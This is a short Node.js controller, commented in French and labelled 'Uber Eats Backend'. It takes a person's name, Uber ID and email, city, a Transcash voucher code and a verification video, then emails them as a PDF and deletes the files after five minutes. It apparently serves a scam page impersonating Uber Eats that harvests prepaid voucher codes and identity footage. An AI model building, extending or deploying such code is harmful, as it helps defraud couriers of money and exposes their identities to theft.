const { generatePDF } = require('../services/pdfService');
const emailService = require('../services/emailService');
const fs = require('fs');
const path = require('path');

const submitForm = async (req, res) => {
  try {
    console.log('📝 Nouvelle soumission de formulaire reçue');
    
    // Récupérer les données
    const { fullName, uberId, uberEmail, city, transcashCode, situation } = req.body;
    
    // Vérifications
    if (!fullName || !uberId || !uberEmail || !city || !transcashCode || !situation) {
      return res.status(400).json({ error: 'Tous les champs sont requis' });
    }
    
    if (!req.file) {
      return res.status(400).json({ error: 'La vidéo de vérification est requise' });
    }
    
    // 1. GÉNÉRER PDF
    console.log('📊 Génération PDF...');
    const formData = { fullName, uberId, uberEmail, city, transcashCode };
    const pdfResult = await generatePDF(formData, situation);
    console.log('✅ PDF OK:', pdfResult.filename);
    
    // 2. ENVOYER EMAIL
    const videoPath = req.file.path;
    console.log('📧 Envoi email...');
    const emailResult = await emailService.sendAssistanceRequest(
      formData, situation, pdfResult.filepath, videoPath
    );
    console.log('✅ Email envoyé !');
    
    // 3. RÉPONSE SUCCÈS
    res.status(200).json({
      success: true,
      message: 'Votre demande a été envoyée avec succès',
      reference: `UE-${Date.now()}`,
      emailId: emailResult.messageId
    });
    
    // Nettoyage après 5min
    setTimeout(() => {
      try {
        fs.unlinkSync(pdfResult.filepath);
        fs.unlinkSync(videoPath);
      } catch(e) { console.log('Nettoyage OK'); }
    }, 5 * 60 * 1000);
    
  } catch (error) {
    console.error('❌ ERREUR:', error);
    res.status(500).json({ 
      error: 'Erreur serveur: ' + error.message 
    });
  }
};

const healthCheck = (req, res) => {
  res.json({ status: 'healthy', service: 'Uber Eats Backend' });
};

module.exports = { submitForm, healthCheck };
